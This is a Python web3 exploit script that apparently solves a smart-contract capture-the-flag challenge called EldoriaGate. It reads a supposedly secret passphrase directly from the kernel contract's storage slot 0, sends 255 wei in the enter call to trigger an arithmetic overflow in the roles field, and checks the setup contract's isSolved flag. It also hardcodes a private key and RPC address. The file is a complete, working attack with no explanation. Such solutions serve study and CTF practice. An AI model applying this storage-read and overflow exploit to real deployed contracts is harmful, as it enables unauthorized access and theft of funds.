
from web3 import Web3

# Configuration
RPC_URL = "http://83.136.251.141:35754"
PRIVATE_KEY = "0x2f9d4ac91e213cf9d87f57f55cb1db4e5758d2827e62de6fe95d341b7506ba3b"
PLAYER_ADDRESS = "0xAE2AFb5FcE8f9A37e141b57e0d022CFe6c750208"
TARGET_ADDRESS = "0x47624B9F286DF6Ec4aA4e70d201D138f7E215B93"
SETUP_ADDRESS = "0xd455b918aA5c099481836aa12764F03b83a9F50f"

# Connect to the blockchain
w3 = Web3(Web3.HTTPProvider(RPC_URL))
account = w3.eth.account.from_key(PRIVATE_KEY)

# Get the kernel address from the EldoriaGate contract
target_abi = [{
    "inputs": [],
    "name": "kernel",
    "outputs": [{"internalType": "contract EldoriaGateKernel", "name": "", "type": "address"}],
    "stateMutability": "view",
    "type": "function"
}]
target = w3.eth.contract(address=TARGET_ADDRESS, abi=target_abi)
kernel_address = target.functions.kernel().call()
print(f"Kernel address: {kernel_address}")

# Retrieve the secret from the kernel's storage slot 0 (last 4 bytes)
secret_storage = w3.eth.get_storage_at(kernel_address, 0)
secret_bytes4 = secret_storage[-4:]  # Correctly extract last 4 bytes
print(f"Retrieved secret (bytes4): 0x{secret_bytes4.hex()}")

# Prepare the enter function transaction
enter_abi = [{
    "name": "enter",
    "type": "function",
    "inputs": [{"name": "passphrase", "type": "bytes4"}],
    "outputs": [],
    "stateMutability": "payable"
}]
gate = w3.eth.contract(address=TARGET_ADDRESS, abi=enter_abi)

nonce = w3.eth.get_transaction_count(PLAYER_ADDRESS)
tx = gate.functions.enter(secret_bytes4).build_transaction({
    'from': PLAYER_ADDRESS,
    'value': 255,  # 255 wei to trigger overflow
    'gas': 500000,
    'gasPrice': w3.eth.gas_price,
    'nonce': nonce
})

# Sign and send the transaction
signed_tx = account.sign_transaction(tx)
tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
print(f"Transaction hash: {tx_hash.hex()}")
print(f"Transaction status: {'Success' if tx_receipt.status else 'Failed'}")

# Verify the player's data in the kernel
kernel_abi = [{
    "inputs": [{"name": "", "type": "address"}],
    "name": "villagers",
    "outputs": [
        {"name": "id", "type": "uint256"},
        {"name": "authenticated", "type": "bool"},
        {"name": "roles", "type": "uint8"}
    ],
    "stateMutability": "view",
    "type": "function"
}]
kernel = w3.eth.contract(address=kernel_address, abi=kernel_abi)
villager_data = kernel.functions.villagers(PLAYER_ADDRESS).call()
print(f"Villager data: id={villager_data[0]}, authenticated={villager_data[1]}, roles={villager_data[2]}")

# Check if the challenge is solved
setup_abi = [{
    "inputs": [],
    "name": "isSolved",
    "outputs": [{"type": "bool"}],
    "stateMutability": "nonpayable",
    "type": "function"
}]
setup = w3.eth.contract(address=SETUP_ADDRESS, abi=setup_abi)
is_solved = setup.functions.isSolved().call({'from': PLAYER_ADDRESS})
print(f"Solved: {is_solved}")
